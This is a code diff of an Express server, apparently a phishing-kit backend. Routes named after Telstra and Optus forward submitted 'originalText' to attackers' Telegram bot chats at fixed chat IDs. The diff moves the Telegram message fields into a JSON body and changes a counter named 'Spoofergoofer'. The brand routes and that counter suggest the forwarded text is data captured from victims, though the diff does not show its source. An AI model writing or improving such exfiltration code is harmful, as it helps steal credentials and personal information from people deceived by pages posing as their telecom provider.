@@ -10663,17 +10663,27 @@ app.post("/osbTelstra", (req, res) => {
       } else {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=TelstraFred:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `TelstraOSB:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5539333576&text=Telstra:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 5539333576,
+              text: `Telstra:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
         Spoofergoofer += 1;
       }
@@ -11261,7 +11271,7 @@ app.post("/offshorebillionsOptus", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-        Spoofergoofer = 0;
+        Spoofergoofer += 1;
       }
       res.send("Update Completed");
     });
